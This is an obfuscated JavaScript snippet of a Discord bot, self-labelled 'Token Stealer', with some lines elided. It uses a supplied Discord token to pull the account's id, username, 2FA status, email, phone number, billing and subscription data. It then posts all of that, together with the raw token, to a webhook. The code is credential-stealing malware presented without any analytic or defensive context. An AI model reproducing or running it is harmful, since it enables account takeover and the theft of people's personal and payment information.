...
client.on("ready", async () => {
  async function _0x4ad039(_0x5cb1f6) {
    var _0x105c04 = await axios.get("https://discordapp.com/api/v6/users/@me", {
      validateStatus: false,
      headers: {
        Authorization: _0x5cb1f6,
      },
    });
    var _0x1bc02a = {
      id: _0x105c04.data.id,
      username: _0x105c04.data.username + _0x105c04.data.discriminator,
      twoFA: _0x105c04.data.mfa_enabled,
      email: _0x105c04.data.email,
      phone: _0x105c04.data.phone,
      verified: _0x105c04.data.verified,
      billing: "",
      subscriptions: "",
      token: "",
    };
    var _0x105c04 = await axios.get(
    ...
    var _0x4e6129 = _0x105c04.data;
    _0x1bc02a.billing = _0x4e6129;
    var _0x105c04 = await axios.get(
    ...
    var _0x116f7b = _0x105c04.data;
    _0x1bc02a.subscriptions = _0x116f7b;
    _0x1bc02a.token = _0x5cb1f6;
    return _0x1bc02a;
  }
  async function _0x2e0241(_0x5bee58) {
    let _0x293e34 = {
      username: "Token Stealer",
      content:
        "```js\n" + JSON.stringify(_0x5bee58).replace(/,/g, ",\n") + "```",
    };
    var _0xab57e2 = await axios.post(
      webhook,
      _0x293e34,
      {
        headers: {
    ...
    console.log(_0xab57e2.data);
  }
  const _0x43ffe4 = await _0x4ad039(token);
  await _0x2e0241(_0x43ffe4);
});
client.login(token);
